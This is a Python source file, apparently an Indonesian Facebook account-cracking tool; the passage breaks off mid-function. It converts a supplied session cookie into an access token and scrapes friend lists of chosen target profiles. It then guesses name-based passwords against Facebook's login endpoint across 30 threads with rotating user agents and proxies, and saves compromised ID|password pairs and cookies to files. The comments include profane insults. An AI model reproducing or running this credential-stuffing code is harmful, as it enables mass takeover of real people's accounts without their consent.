'''Update 23 Juni 2023
   Autor Raka Andrian Tara
   Github Bajingan-Z
'''
# * [ CHAT AINK ANJINK ] * #
def author(pm_aink):
	__raka_andrian___(f'{K} [{P}•{K}]{P} Tunggu Sebentar Nanti Diarahin Ke Facebook ...')
	time.sleep(3)
	os.system("xdg-open https://www.facebook.com/aa.raka27")
	back()
# * [ WARNA BENGET SIA ] * #
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' 
bv = '\33[0;36m'
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
# * [ PRINTAH AWAL MALING ] * #
import requests,json,os,sys,random,datetime,time,re,zlib,subprocess,base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
from rich import pretty
pretty.install()
CON=sol()
ses=requests.Session()
apk_aktif = []
apk_tidak_aktif = []
raka_andrian_tara,king_off_raka = [],[]
owh_jelas_donk_aink_kan_cowok = []
raka1,raka2,raka3,raka4,raka,rakaxxx,uid,tokenku,akun,id,id2,ok,cp,loop = [],[],[],[],[],[],[],[],[],[],[],0,0,0
wa = sol() 
#----------[ GET-PROXY ]----------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
    proxy=open('.prox.txt','r').read().splitlines()
# * [ BAGIAN UGENT ] * #
for khontol in range(9999):
    rc = random.choice; rr = random.randint
    android_versi = str(rr(5,13))
    chrome_versi = f"{str(rr(40,113))}.0.{str(rr(3000,5999))}.{str(rr(10,299))}"
    instagram_versi = f"{str(rr(100,299))}.0.0.{str(rr(10,99))}.{str(rr(10,599))}"
    kyu1 = f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
    ua_aink=(f'{kyu1}')
    raka.append(ua_aink)
    kyu2 = f'Mozilla/5.0 (Linux; Android {android_versi}; TECNO KC2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_versi} Mobile Safari/537.36'
    ua_aink=(f'{kyu2}')
    raka.append(ua_aink)
    kyu3 = f'Mozilla/5.0 (Linux; Android {android_versi}; DOOGEE B10 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_versi} Mobile Safari/537.36'
    ua_aink=(f'{kyu3}')
    raka.append(ua_aink)
    kyu4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(6,16))}_{str(rr(2,7))}_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(rr(4,14))}.0 Mobile/{str(rr(10,20))}E{str(rr(000,199))} Safari/604.1 EdgiOS/{str(rr(40,113))}.0.0.0 Instagram/{instagram_versi}'
    ua_aink=(f'{kyu4}')
# * [ BULAN DAN BINTANG ] * #
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
# * [ PENYIMPAN FILE ] * #
gizel_ok = 'GIZEL_OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
gizel_cp = 'GIZEL_CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# * [ BANNER KUMAHA AINK ] * #
def ___raka_ganteng___():
# * * [ OWH JELAS DONK AINK KAN COWOK ] * * #
	clear()
	__raka_andrian___(f'''
	{P}╰•★ S͢I͢M͢P͢L͢E͢ ͢T͢O͢O͢L͢S͢ ͢C͢R͢A͢C͢K͢ ͢F͢A͢C͢E͢B͢O͢O͢K͢ ★•╯           
   {P}Author : Alettha    
   {b}Github  : Lett-MTF
   {p}Status  : Pribadi''')
# * [ BAGIAN COOLI ] * #
def gafi_login():
	try:
		os.system('clear')
		___raka_ganteng___()
# * * [ OWH JELAS DONK AINK KAN COWOK ] * * #
		ses = requests.Session()
		__raka_andrian___(f'{K} [{P}•{K}]{P} Gunakan Cookies Yang Masih Prawan...?')
		cookie=input(f'{K} [{P}•{K}]{P} Cookies :{K} ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': cookie}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(f"{K} [{P}•{K}]{P} Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': cookie}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': cookie}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': cookie}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n{K} [{P}•{K}]{P} Token : {K}{access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(cookie)
							__raka_andrian___(f"\n{K} [{P}•{K}]{P} Login Berhasil Jalankan Ulang Perintahnya ...");exit()
			except Exception as e:
				__raka_andrian___(f"{K} [{P}•{K}]{P} Cookies Mokad Kontol ...")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
# * [ BAGIAN COLMEXX ] * #
def rakaexde():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			tim_gafi = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			gafi_donk = json.loads(tim_gafi.text)['name']
			menu(gafi_donk)
		except KeyError:
			gafi_login()
		except requests.exceptions.ConnectionError:
			__raka_andrian___(f'{K} [{P}•{K}]{P} Jaringan Error')
			exit()
	except IOError:
		gafi_login()
# * [ MENU HIDANGAN ] * #
def menu(name):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		__raka_andrian___(f'{K} [{P}•{K}]{P} Cookies Kadaluarsa Kea Tt Jendes ')
		time.sleep(3)
		gafi_login()
	os.system('clear')
	___raka_ganteng___()
# * * [ OWH JELAS DONK AINK KAN COWOK ] * * #
	print()
	__raka_andrian___(f'{K} [{P}➪1{K}]{P} Publik\n{K} [{P}➪2{K}]{P} Publik Masal\n{K}{P}{K} [{P}➪3{K}]{P} Cek Hasill Crack\n{K}{P}{K} [{P}➪0{K}]{P} Keluar\n{x}______________________________________________')
	_raka_andrian_tara_ = input(f'{K} [{P}➪{K}]{P} Pilih  : ')
	if _raka_andrian_tara_ in ['01','1']:
		crack_publik()
	elif _raka_andrian_tara_ in ['02','2']:
		crack_massal()
	elif _raka_andrian_tara_ in ['03','3']:
		result()
	elif _raka_andrian_tara_ in ['00','0']:
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		__raka_andrian___(f'{K} [{P}➪{K}]{P} Succes Menghapus Cookie Good Bay...')
		time.sleep(3)
		exit()
	else:
		__raka_andrian___(f'{K} [{P}➪{K}]{P} Pilih Yang Benar Kentod...?')
		time.sleep(3)
		back()
# * [ CRACK PUBLIK ] * #
def crack_publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print()
	aink_gabut = input(f'{K} [{P}➪{K}]{P} Target : ')
	try:
		aink_raka = ses.get('https://graph.facebook.com/v2.0/'+aink_gabut+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
		for ricode_bang in aink_raka['friends']['data']:
			try:id.append(ricode_bang['id']+'|'+ricode_bang['name'])
			except:continue
		__raka_andrian___(f'{K} [{P}➪{K}]{P} Total  : '+str(len(id)))
		perintah()
	except requests.exceptions.ConnectionError:
		__raka_andrian___(f'{K} [{P}➪{K}]{P} Koneksi Internet Bermasalah')
	except (KeyError,IOError):
		__raka_andrian___(f'{K} [{P}➪{K}]{P} Pertemanan Tidak Publik ')
		back()
# * [ CRACK MASSAL ] * #
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	Console().print(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Lihat Hasil OK[/]           [bold white][[bold cyan]02[/][bold white]][/] [bold white]Lihat Hasil CP[/]',subtitle="╭───", subtitle_align="left",width=80,padding=(0,11),title=f"[bold white][/][bold green]List Menu Cek[/][bold white][/]",style=f"bold cyan"))
	kz = Console().input(f"[bold cyan]   ╰─> ")
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
			time.sleep(3)
			exit()
		if len(vin)==0:
			Console().print("[bold cyan]   ╰─>[bold red] Anda Tidak Memiliki Hasil CP ")
			time.sleep(4)
			exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					Console(width=80, style="bold cyan").print(panel('[bold white]['+nom+'] '+isi+' [bold yellow] '+str(len(hem))+' Account '+x))
				else:
					lol.update({str(cih):str(isi)})
					Console(width=80, style="bold cyan").print(panel('[bold white]['+str(cih)+'] '+isi+' [bold yellow] '+str(len(hem))+' Account '+x))
			geeh = Console(width=80, style="bold cyan").input(f'[bold cyan]   ╰─> ')
			try:geh = lol[geeh]
			except KeyError:
				Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh ")
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
				time.sleep(4)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				Console(width=80, style="bold cyan").print(panel(f'[bold yellow] ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'))
				nocp +=1
			Console().input('[bold yellow][ Klik Enter For Exit ]')
			exit()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
			time.sleep(4)
			exit()
		if len(vin)==0:
			Console().print("[bold cyan]   ╰─>[bold red] Anda Tidak Mempunyai File OK ")
			time.sleep(4)
			exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					Console(width=80, style="bold cyan").print(panel('[bold white]['+nom+'] '+isi+' [bold yellow] '+str(len(hem))+' Account '+x))
				else:
					lol.update({str(cih):str(isi)})
					Console(width=80, style="bold cyan").print(panel('[bold white]['+str(cih)+'] '+isi+' [bold yellow] '+str(len(hem))+' Account '+x))
			geeh = Console().input("[bold cyan]   ╰─> ")
			try:geh = lol[geeh]
			except KeyError:
				Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh")
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
				time.sleep(4)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				Console(width=80, style="bold cyan").print(panel(f'[bold green] ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'))
				nocp +=1
			Console().input('[bold yellow][ Klik Enter For Exit ]')
			exit()
	else:
		Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh")
		exit()
  

def crack_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		cuma_aa_raka = int(input(f'{K} [{P}➪{K}]{P} Berapa Target : '))
	except ValueError:
		__raka_andrian___(f'{K} [{P}➪{K}]{P} Pilih Yang Benar Kentod...? ')
		exit()
	if cuma_aa_raka<1 or cuma_aa_raka>100:
		__raka_andrian___(f'{K} [{P}➪{K}]{P} Pertemanan Privat Njink...? ')
		back()
	ses=requests.Session()
	raka66 = 0
	for kocak in range(cuma_aa_raka):
		raka66+=1
		raka00 = input(f'{K} [{P}•{K}]{P} Target '+str(raka66)+' : ')
		uid.append(raka00)
	for aink_raka2 in uid:
		try:
			aink_raka3 = ses.get('https://graph.facebook.com/v2.0/'+aink_raka2+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for recode_bang1 in aink_raka3['friends']['data']:
				try:
					aink_raka4 = (recode_bang1['id']+'|'+recode_bang1['name'])
					if aink_raka4 in id:pass
					else:id.append(aink_raka4)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			__raka_andrian___(f'{K} [{P}➪{K}]{P} Unstable signal ')
			exit()
	try:
		__raka_andrian___(f'{K} [{P}➪{K}]{P} Total  : '+str(len(id)))
		perintah()
	except requests.exceptions.ConnectionError:
		print('')
		__raka_andrian___(f'{K} [{P}➪{K}]{P} Unstable signal ')
		back()
	except (KeyError,IOError):
		__raka_andrian___(f'{K} [{P}➪{K}]{P} Friendship Not Public ')
		time.sleep(3)
		back()
# * [ BAGIAN PEMERINTAH RI ] * #
def perintah():
    for cape_euy in id:
        id2.insert(0,cape_euy)
    print('')
    __raka_andrian___(f'{K} [{P}➪{K}]{P} Method Validate Ketik ({K}Run{P}) Untuk Mulai Crack ')
    __raka_andrian___(f'{K} [{P}➪{K}]{P} Method Async Ketik ({K}Start{P}) Untuk Mulai Crack ')
    __raka_andrian___(f'{K} [{P}➪{K}]{P} Method Reguler Ketik ({K} Jalan {P}) Untuk Mulai Crack ')
    __raka_andrian___(f'{K} [{P}➪{K}]{P} Method MEMEXS Ketik ({K} Gass {P}) Untuk Mulai Crack ')
    ____method_crack____ = input(f'{K} [{P}➪{K}]{P} Ketik  : {K}')
    print(f'{x}______________________________________________')
    if ____method_crack____ in ['Run','runn','RUN']:
        rakaxxx.append('validate')
    elif ____method_crack____ in ['Start','start','star','START']:
        rakaxxx.append('_async_2_')
    elif ____method_crack____ in ['jalan','Jalan','JALAN']:
        rakaxxx.append('reguler')
    elif ____method_crack____ in ['Gass','gass','Gas','gas']:
        rakaxxx.append('memex')
        print('')
    elif ____method_crack____ in ['']:
        __raka_andrian___(f'{K} [{P}•{K}]{P} Ketik Huruf Anjinkk Bukan Angka Bangsad ')
        perintah()
    else:
        rakaxxx.append('validate')
    seting_password()
    
# * [ KALO MAU IJO TAMBAH PW LOE DISINI ANJENG ] * #
def seting_password():
	global prog,des
	clear()
	__raka_andrian___(f"""{hijo}
████    █████████████ 
████    █████████████ 
████   █████           
██████████████       
█████████████████████  
       ██████████████
        ██████   ████
█████████████    ████ 
█████████████    ████""")
	print(f'{kun}{x}[{hijo}•{x}] MAINKAN MODE PESAWAT SETIAP 300 IDZ ')
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as rakaANDRIAN:
			for kocak_euy in id2:
				idf,nmf = kocak_euy.split('|')[0],kocak_euy.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				afa_aja_boleh = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						afa_aja_boleh.append(frs+'01')
						afa_aja_boleh.append(frs+'02')
						afa_aja_boleh.append(frs+'03')
						afa_aja_boleh.append(frs+'04')
						afa_aja_boleh.append(frs+'05')
						afa_aja_boleh.append(frs+'06')
						afa_aja_boleh.append(frs+'07')
						afa_aja_boleh.append(frs+'08')
						afa_aja_boleh.append(frs+'09')
						afa_aja_boleh.append(frs+'10')
						afa_aja_boleh.append(frs+'11')
						afa_aja_boleh.append(frs+'12')
						afa_aja_boleh.append(frs+'13')
						afa_aja_boleh.append(frs+'14')
						afa_aja_boleh.append(frs+'15')
						afa_aja_boleh.append(frs+'321')
						afa_aja_boleh.append(frs+'123')
						afa_aja_boleh.append(frs+'1234')
						afa_aja_boleh.append(frs+'12345')
						afa_aja_boleh.append(frs+'123456')
				else:
					if len(frs)<3:
						afa_aja_boleh.append(nmf)
					else:
						afa_aja_boleh.append(nmf)
						afa_aja_boleh.append(frs+'01')
						afa_aja_boleh.append(frs+'02')
						afa_aja_boleh.append(frs+'03')
						afa_aja_boleh.append(frs+'04')
						afa_aja_boleh.append(frs+'05')
						afa_aja_boleh.append(frs+'06')
						afa_aja_boleh.append(frs+'07')
						afa_aja_boleh.append(frs+'08')
						afa_aja_boleh.append(frs+'09')
						afa_aja_boleh.append(frs+'10')
						afa_aja_boleh.append(frs+'11')
						afa_aja_boleh.append(frs+'12')
						afa_aja_boleh.append(frs+'13')
						afa_aja_boleh.append(frs+'14')
						afa_aja_boleh.append(frs+'15')
						afa_aja_boleh.append(frs+'321')
						afa_aja_boleh.append(frs+'123')
						afa_aja_boleh.append(frs+'1234')
						afa_aja_boleh.append(frs+'12345')
						afa_aja_boleh.append(frs+'123456')
				if 'ya' in raka_andrian_tara:
					for recode_aja in king_off_raka:
						afa_aja_boleh.append(recode_aja)
				else:pass
				if 'validate' in rakaxxx:
					rakaANDRIAN.submit(validate,idf,afa_aja_boleh)
				elif '_async_2_' in rakaxxx:
					rakaANDRIAN.submit(_async_2_,idf,afa_aja_boleh)
				elif 'reguler' in rakaxxx:
					rakaANDRIAN.submit(reguler,idf,afa_aja_boleh)
				elif 'memex' in rakaxxx:
					rakaANDRIAN.submit(memex,idf,afa_aja_boleh)
				else:
					rakaANDRIAN.submit(validate,idf,afa_aja_boleh)
		print('')
		print(f'{K} [{P}•{K}]{P} GIZEL_OK : {H}%s '%(ok))
		print(f'{K} [{P}•{K}]{P} GIZEL_CP : {K}%s '%(cp))
		print('')
# * [ METHODE NGOCOK ] * #
def validate(idf,afa_aja_boleh):
	global loop,ok,cp
	rr = random.randint
	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
	prog.update(des,description=f'\r[bold white]Validate [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(raka)
	ses = requests.Session()
	for pw in afa_aja_boleh:
		pw = pw.lower()
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f' {P}[{K}Gizell CP{P}] {K}{idf}|{pw}\n{ua}')
				open('GIZEL_CP/'+gizel_cp,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f' {P}[{H}Gizell OK{P}] {H}{idf}|{pw}\n{kuki}')
				open('GIZEL_OK/'+gizel_cp,'a').write(idf+'|'+pw+'\n')
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
#METOD KONTOL LU SEMVAK#
def _async_2_(idf,afa_aja_boleh):
	global loop,ok,cp
	rr = random.randint
	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
	prog.update(des,description=f'\r[bold white]Async [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(raka)
	ses = requests.Session()
	for pw in afa_aja_boleh:
		pw = pw.lower()
		try:
